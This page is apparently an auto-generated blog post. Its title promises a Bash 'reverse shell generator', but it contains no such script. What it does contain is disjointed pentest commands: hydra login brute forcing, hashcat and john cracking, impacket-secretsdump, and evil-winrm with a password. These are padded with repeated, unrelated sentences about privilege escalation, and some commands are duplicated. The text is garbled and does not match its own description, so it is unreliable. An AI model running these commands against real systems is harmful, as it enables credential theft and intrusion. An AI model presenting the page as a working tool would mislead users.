---
TitleSEO: "Reverse Shell Generator in Bash | ZureFX"
TitlePost: "Reverse Shell Generator — Bash"
Author: "ZureFX"
Description: "A Bash script for reverse shell generator. Built for security research and automation."
Keywords: "parser, scanner, fuzzer, bash, go"
URL: "https://zurefx.github.io/scripting/script-reverse-shell-generator-260.html"
URL_IMAGES: ""
Date: "2024-12-03"
Tags: "Parser, Scanner, Fuzzer, Bash, Go"
Section: "scripting"
Lang: "en"
main_img: "script-reverse-shell-generator-260"
Permalink: "/scripting/script-reverse-shell-generator-260.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

Privilege escalation was possible due to misconfigured sudo permissions. Unconstrained delegation was enabled on the compromised machine. Privilege escalation was possible due to misconfigured sudo permissions.

Built with **Bash** for offensive security automation.

### Requirements

- Bash
- `evil-winrm`
- `rpcclient`
- `enum4linux`

## Implementation

### Core Logic

Token impersonation allowed elevation to SYSTEM privileges on the target. The scheduled task ran with elevated privileges and could be abused for escalation.

```bash
nmap -sCV -p9200,23,3389 10.81.127.126 -oN scan.txt
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.97.61.130 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
gobuster dir -u http://10.33.184.56/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

Authentication bypass was achieved through careful manipulation of the login mechanism. Initial enumeration revealed several interesting open ports on the target.

### Helper Functions

Unconstrained delegation was enabled on the compromised machine. The backup files contained sensitive information that should not have been accessible.

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

## Usage

### Basic Usage

Command injection was possible through unsanitized user input in the search functionality. Initial enumeration revealed several interesting open ports on the target.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.98.154.13
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
feroxbuster -h
```

### Advanced Options

The backup files contained sensitive information that should not have been accessible. The service account had excessive permissions assigned in Active Directory. Authentication bypass was achieved through careful manipulation of the login mechanism.

```bash
evil-winrm -i 10.75.128.57 -u administrator -p 'P@ssw0rd!'
nmap -sCV -p995,993,8888 10.28.235.210 -oN scan.txt
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.67.243.221 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

## Output

### Example Output

Group Policy Preferences contained encrypted but recoverable credentials. Unconstrained delegation was enabled on the compromised machine.

```
[+] Scanning target...
[+] Found 14 results
[+] Done in 25.27s
```
